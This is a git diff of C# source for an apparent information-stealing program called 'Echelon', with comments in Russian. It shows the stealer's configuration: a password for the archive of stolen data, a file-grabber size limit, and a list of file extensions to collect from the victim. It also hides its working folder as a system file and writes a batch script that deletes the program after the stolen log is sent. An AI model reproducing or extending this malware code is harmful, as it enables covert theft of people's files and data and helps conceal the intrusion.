@@ -23,10 +23,10 @@ namespace Echelon
         // Пароль для архива с логом:
         public static string passwordzip = "Echelon";
 
-        // 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
+        // максимальный вес файла в файлграббере 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
         public static int FileSize = 10500000;
 
-        // Список расширений для сбора (лимит веса файлов в GetFiles.cs)
+        // Список расширений для сбора файлов
         public static string[] Echelon_Size = new string[]
         {
           ".txt", ".rpd", ".suo", ".config", ".cs", ".csproj", ".tlp", ".sln",
@@ -35,7 +35,7 @@ namespace Echelon
         [STAThread]
         private static void Main()
         {
-            // Подключаем DotNetZip.dll
+            // Подключаем DotNetZip.dll, должен быть в ресурсах проекта и подключен как ссылка
             AppDomain.CurrentDomain.AssemblyResolve += AppDomain_AssemblyResolve;
             Assembly AppDomain_AssemblyResolve(object sender, ResolveEventArgs args)
             {
@@ -66,7 +66,7 @@ namespace Echelon
                 File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
             }
 
-            // Самоудаление и добавление в планировщик задач с интервалом в 4 минуты
+            // Самоудаление после отправки лога
             string batch = Path.GetTempFileName() + ".bat";
             using (StreamWriter sw = new StreamWriter(batch))
             {
